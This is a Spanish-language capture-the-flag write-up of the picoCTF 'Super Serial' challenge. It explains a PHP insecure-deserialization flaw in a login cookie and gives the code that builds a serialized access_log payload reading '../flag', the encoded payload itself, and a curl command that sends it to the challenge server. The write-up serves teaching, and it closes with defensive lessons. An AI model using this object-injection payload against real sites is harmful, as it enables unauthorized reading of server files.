# Writeup: Super_Serial
**Categoría:** Medium
**Fecha de conversión:** 2026-05-04

---

Writeup detallado de "Super Serial" (picoCTF)


### Análisis del código fuente


Accedemos a los archivos .phps (PHP source) para ver el código:


```
    index.phps: formulario de login, crea un objeto permissions con usuario y contraseña, y si es invitado o admin guarda el objeto serializado en la cookie login.

    authentication.phps: página que se muestra después del login. Contiene la clase access_log y un bloque que muestra "Welcome guest" o "Welcome admin". También incluye cookie.php.

    cookie.phps: define la clase permissions y la lógica de verificación de cookie.

```

Clase permissions (cookie.php)

php


class permissions {

```
    public $username;
    public $password;
    function __construct($u, $p) { ... }
    function is_guest() { ... }  // comprueba en la BD si es guest
    function is_admin() { ... }
    function __toString() { return $u.$p; }
```

}


Esta clase no es vulnerable por sí misma, pero su método __toString solo devuelve las credenciales.

Clase access_log (authentication.php)

php


class access_log {

```
    public $log_file;
    function __construct($lf) { $this->log_file = $lf; }
    function __toString() { return $this->read_log(); }
    function read_log() { return file_get_contents($this->log_file); }
```

}


Esta clase sí es vulnerable: su método __toString lee y devuelve el contenido de cualquier archivo especificado en $log_file.

Mecanismo de deserialización en cookie.php


Al final de cookie.php encontramos:

php


if(isset($_COOKIE["login"])){

```
    try{
        $perm = unserialize(base64_decode(urldecode($_COOKIE["login"])));
        $g = $perm->is_guest();
        $a = $perm->is_admin();
    }
    catch(Error $e){
        die("Deserialization error. ".$perm);
    }
```

}


Punto clave: Si ocurre un error durante la deserialización o al llamar a is_guest()/is_admin(), se ejecuta die("Deserialization error. ".$perm);. Al concatenar $perm con un string, PHP intenta convertir $perm a string, lo que activa su método __toString() si existe.


Además, si la cookie contiene un objeto que no es de la clase permissions (por ejemplo, un access_log), el método is_guest() no existe y se lanza una excepción, entrando en el catch y mostrando el error con $perm. Esto nos permite inyectar un objeto access_log que lea cualquier archivo.

Construcción del payload


```
    Creamos un objeto de la clase access_log (disponible en authentication.php aunque no esté incluida directamente en cookie.php, pero al estar en el mismo servidor, la clase existe y puede ser deserializada).

    Le asignamos a la propiedad log_file la ruta del archivo que queremos leer. La flag suele estar en ../flag o ../flag.txt. Probamos ambas.

    Serializamos el objeto, lo codificamos en base64 y luego en urlencode (porque la cookie se guardó así originalmente).

```

Código PHP para generar el **payload**:

php


<?php

class access_log { public $log_file; }

```bash
$obj = new access_log();
```

```bash
$obj->log_file = "../flag";   // ruta exacta que funcionó
```

```bash
$payload = urlencode(base64_encode(serialize($obj)));
```

echo $payload;

?>


Ejecutando esto obtenemos:

text


TzoxMDoiYWNjZXNzX2xvZyI6MTp7czo4OiJsb2dfZmlsZSI7czo3OiIuLi9mbGFnIjt9


(**Nota**: el resultado puede variar según la longitud de la cadena; aquí "../flag" tiene 7 caracteres)

Explotación


Enviamos una petición GET a authentication.php con la cookie login establecida a ese valor.


Usando curl:

bash


curl -k -H "**Cookie**: login=TzoxMDoiYWNjZXNzX2xvZyI6MTp7czo4OiJsb2dfZmlsZSI7czo3OiIuLi9mbGFnIjt9" http://wily-courier.picoctf.net:64032/authentication.php


El servidor responde:

text


Deserialization error. picoCTF{***********************}


La flag aparece en el mensaje de error porque $perm es el objeto access_log y al concatenarlo se ejecuta su __toString(), que lee el archivo ../flag y lo devuelve.

¿Por qué funcionó?


```
    Deserialización insegura: El servidor acepta datos serializados proporcionados por el usuario y los deserializa sin validar su tipo.

    Manejo de errores inapropiado: Al capturar una excepción, se muestra el objeto directamente, activando su método mágico __toString().

    Clase access_log con capacidad de lectura de archivos: No se esperaba que un objeto de esa clase fuera deserializado, pero al existir en el mismo contexto, PHP puede instanciarlo y llamar a sus métodos.

```

Lecciones aprendidas


```
    Nunca confiar en datos serializados provenientes del cliente.

    No exponer objetos en mensajes de error.

    Revisar cuidadosamente los archivos fuente disponibles en .phps.

    Probar diferentes rutas de archivo (sin extensión, con extensión, rutas relativas) hasta encontrar la flag.
```

